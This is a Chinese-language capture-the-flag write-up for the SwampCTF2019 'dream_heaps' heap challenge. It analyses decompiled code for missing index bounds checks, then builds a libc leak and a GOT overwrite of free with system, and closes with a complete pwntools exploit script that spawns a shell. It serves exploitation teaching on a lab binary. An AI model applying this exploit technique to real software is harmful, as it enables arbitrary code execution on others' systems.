---
title: nightmare 4.4.SwampCTF2019-DreamHeaps-wp
date: 2023-08-31 20:47:44
tags:
- CTF
- pwn
- heap 
- got  
- index
- SwampCTF2019
- nightmare
categories:
- pwn-wp
---

[相关资源](https://github.com/guyinatuxedo/nightmare/tree/master/modules/11-index/swampctf19_dreamheaps)  

## 文件分析

```sh
$ checksec dream_heaps 
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
$ ./dream_heaps 
Online dream catcher! Write dreams down and come back to them later!

What would you like to do?
1: Write dream
2: Read dream
3: Edit dream
4: Delete dream
5: Quit
```

## 代码分析

菜单题，主要就4个功能

### 0x1 new

```c
unsigned __int64 new_dream() {
  int v1; // [rsp+Ch] [rbp-14h] BYREF
  void *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
  v3 = __readfsqword(0x28u);
  v1 = 0;
  puts("How long is your dream?");
  __isoc99_scanf("%d", &v1);
  buf = malloc(v1);
  puts("What are the contents of this dream?");
  read(0, buf, v1);
  HEAP_PTRS[INDEX] = (__int64)buf;
  SIZES[INDEX++] = v1;
  return __readfsqword(0x28u) ^ v3;
}
```

可以追踪到bss段`INDEX, HEAP_PTRS, SIZES`的分布；发现HEAP_PTRS相当于长度为8的指针数组，SIZES也是长度为8的int数组

但是新增heap**没有检测INDEX是否超出7**，所以这里可以覆盖SIZES

```assembly
.bss:000000000060208C                               public INDEX
.bss:000000000060208C ?? ?? ?? ??                   INDEX dd ?                              ; DATA XREF: new_dream+70↑r
.bss:000000000060208C                                                                       ; new_dream+84↑r
.bss:000000000060208C                                                                       ; new_dream+96↑r
.bss:000000000060208C                                                                       ; new_dream+9F↑w
.bss:000000000060208C                                                                       ; read_dream+41↑r
.bss:000000000060208C                                                                       ; edit_dream+41↑r
.bss:000000000060208C                                                                       ; delete_dream+41↑r
.bss:0000000000602090 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+align 20h
.bss:00000000006020A0                               public HEAP_PTRS
.bss:00000000006020A0                               ; __int64 HEAP_PTRS[8]
.bss:00000000006020A0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+HEAP_PTRS dq 8 dup(?)                             ; 0
.bss:00000000006020A0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+                                        ; DATA XREF: new_dream+7C↑w
.bss:00000000006020A0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+                                        ; read_dream+5C↑r
.bss:00000000006020A0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+                                        ; edit_dream+5C↑r
.bss:00000000006020A0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+                                        ; delete_dream+5C↑r
.bss:00000000006020A0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+                                        ; delete_dream+79↑w
.bss:00000000006020E0                               public SIZES
.bss:00000000006020E0                               ; int SIZES[]
.bss:00000000006020E0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+SIZES dd 8 dup(?)                             ; 0
.bss:00000000006020E0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+                                        ; DATA XREF: new_dream+8F↑w
.bss:00000000006020E0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+ 
```

### 0x2 read

读入下标输出对应内容，注意只检测了v1不超过INDEX但是没有检查是否小于0，因此**可以写入负数**实现多地址内容读取从而泄露libc基地址

```c
unsigned __int64 read_dream() {
  int v1; // [rsp+Ch] [rbp-14h] BYREF
  const char *v2; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
  v3 = __readfsqword(0x28u);
  puts("Which dream would you like to read?");
  v1 = 0;
  __isoc99_scanf("%d", &v1);
  if ( v1 <= INDEX ) {
    v2 = (const char *)HEAP_PTRS[v1];
    printf("%s", v2);
  }
  else {
    puts("Hmm you skipped a few nights...");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

### 0x3 edit

从HEAP_PTRS和SIZES分别取指针和大小，然后对应更改，同样也是存在未检测下标为负的情况

```c
unsigned __int64 edit_dream() {
    int v1;              // [rsp+8h] [rbp-18h] BYREF
    int v2;              // [rsp+Ch] [rbp-14h]
    void *buf;           // [rsp+10h] [rbp-10h]
    unsigned __int64 v4; // [rsp+18h] [rbp-8h]

    v4 = __readfsqword(0x28u);
    puts("Which dream would you like to change?");
    v1 = 0;
    __isoc99_scanf("%d", &v1);
    if (v1 <= INDEX) {
        buf = (void *)HEAP_PTRS[v1];
        v2 = SIZES[v1];
        read(0, buf, v2);
        *((_BYTE *)buf + v2) = 0;
    } else {
        puts("You haven't had this dream yet...");
    }
    return __readfsqword(0x28u) ^ v4;
}
```

### 0x4 delete

free完指针置为0  没有Use after free

```c
unsigned __int64 delete_dream() {
    int v1;              // [rsp+Ch] [rbp-14h] BYREF
    void *ptr;           // [rsp+10h] [rbp-10h]
    unsigned __int64 v3; // [rsp+18h] [rbp-8h]

    v3 = __readfsqword(0x28u);
    puts("Which dream would you like to delete?");
    v1 = 0;
    __isoc99_scanf("%d", &v1);
    if (v1 <= INDEX) {
        ptr = (void *)HEAP_PTRS[v1];
        free(ptr);
        HEAP_PTRS[v1] = 0LL;
    } else {
        puts("Nope, you can't delete the future.");
    }
    return __readfsqword(0x28u) ^ v3;
}
```

## 攻击方法

### 0x1 泄露libc基地址

我们知道可以通过read_dream结合负偏移量打印任意地址里的内容，但具体打印什么地址的内容呢？最好是got表中的地址，这样printf("%s")就会输出某个函数真实地址

这里我们通过gdb中的`search-pattern 0x00000`尝试查找`0x602020 (put@got)` 

```assembly
gef➤  search-pattern 0x602020
[+] Searching '\x20\x20\x60' in memory
[+] In 'nightmare/11-index/swampctf19_dreamheaps/dream_heaps'(0x400000-0x401000), permission=r-x
  0x400538 - 0x40053c  →   "\x20\x20\x60[...]" 
gef➤  x/10gx 0x400538
0x400538:	0x0000000000602020	0x0000000200000007
0x400548:	0x0000000000000000	0x0000000000602028
0x400558:	0x0000000300000007	0x0000000000000000
0x400568:	0x0000000000602030	0x0000000400000007
0x400578:	0x0000000000000000	0x0000000000602038
```

发现`0x400538`刚好有，那么我们应该从`HEAP_PTRS(0x6020a0)`偏移到这个位置       

 `(0x6020a0-0x400538) // 8 == 263021` 由此当我们输入下标为`-263021`时即可输出puts的真实地址

### 0x2 改写got表

改写比较好的选择就是free的真实地址，只在delete的时候被用到，只要堆的内容是/bin/sh改写成system真实地址之后就可以直接执行

#### 尝试一

通过和0x1中同样方法可以知道下标-263024能拿到free@got的地址，首先就想着能不能通过edt直接改，但是edt还要拿一个size，由于HEAP_PTRS和SIZES相差8个qword即64个字节，偏移之后同样也是差64个字节，可以看到size为0，所以写不了

```assembly
gef➤  search-pattern 0x602020
0x400520 - 0x40052c
gef➤  x/10gx 0x400520
0x400520:	[HEAP_PTRS-263024]➤	0x0000000000602018 	0x0000000100000007
0x400530:	0x0000000000000000	0x0000000000602020
0x400540:	0x0000000200000007	0x0000000000000000
0x400550:	0x0000000000602028	0x0000000300000007
0x400560:	[SIZES-263024]➤	0x0000000000000000	0x0000000000602030
0x400570:	0x0000000400000007	0x0000000000000000
```

#### 最后

因为new_dream创建超过8后就会覆盖SIZES数组，因此SIZES内容可控，同时也可以作为HEAP_PTRS中的指针；因此可以写入free@got 0x602018，经尝试后写入SIZES[18]即为HEAP_PTRS[17]，对应大小即SIZES[17]   理想情况即为：

```assembly
gef➤  sq 0x00000000006020A0
0x6020a0 <HEAP_PTRS>:	0x0000000000b74270	0x0000000000b74290
0x6020b0 <HEAP_PTRS+16>:	0x0000000000b742b0	0x0000000000b742d0
0x6020c0 <HEAP_PTRS+32>:	0x0000000000b742f0	0x0000000000b74310
0x6020d0 <HEAP_PTRS+48>:	0x0000000000b74330	0x0000000000b74350
0x6020e0 <SIZES>:	0x0000000000b74370	0x0000000000b74390
0x6020f0 <SIZES+16>:	0x0000000000b743b0	0x0000000000b743d0
0x602100:	0x0000000000b743f0	0x0000000000b74410
0x602110:	0x0000000000b74430	0x0000001000b74450
0x602120:	0x00000010[size➤]00000010	0x0000000000602018	# here
0x602130:	0x00007f8c121fd010	0x0000000000000000
```

然后再edit HEAP[17]，改写为system真实地址   最后delete调用free即可触发

## exp

```python
from pwn import *
from ctypes import *
import sys

pty = process.PTY
context(os='linux', arch='i386', log_level='debug')
mode = ''
if len(sys.argv) > 1:
    mode = sys.argv[1]

proc = process("./dream_heaps")
belf = ELF("./dream_heaps")
libc = ELF("./libc-2.27.so")

def s(x): proc.send(x)
def sl(x): return proc.sendline(x)
def sd(x): return proc.send(x)
def sla(x, y): return proc.sendlineafter(x, y)
def sa(x, y): return proc.sendafter(x, y)
def ru(x): return proc.recvuntil(x)
def rc(): return proc.recv()
def rl(): return proc.recvline()
def li(con): return log.info(con)
def ls(con): return log.success(con)
def pi(): return proc.interactive()
def pcls(): return proc.close()
def ga(): return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))

def add(size, con):
    sla(b'> ', b'1')
    sla(b'dream?', str(size).encode())
    sa(b'dream?', con)

def edt(idx, con):
    sla(b'> ', b'3')
    sla(b'change?', str(idx).encode())
    s(con[:6])

def shw(idx):
    sla(b'> ', b'2')
    sla(b'read?', str(idx).encode())


def rmv(idx):
    sla(b'> ', b'4')
    sla(b'delete?', str(idx).encode())


gscript = '''
    unhook-chunks
    b * 0x400b2d
    sq 0x00000000006020A0
'''
if mode == '-d':
    gdb.attach(proc, gdbscript=gscript)

heap_arr = 0x00000000006020A0
free_got = belf.got['free']

# 泄露libc
shw(-263021)
libc_base = ga() - libc.sym['puts']
success("libc base: " + hex(libc_base))

# heap_arr 溢出
for i in range(18):
    add(0x10, b'/bin/sh')
# size为0x602018
add(free_got, b'h')

edt(17, p64(libc_base + libc.sym['system']))
rmv(0)

pi()
pause()
```

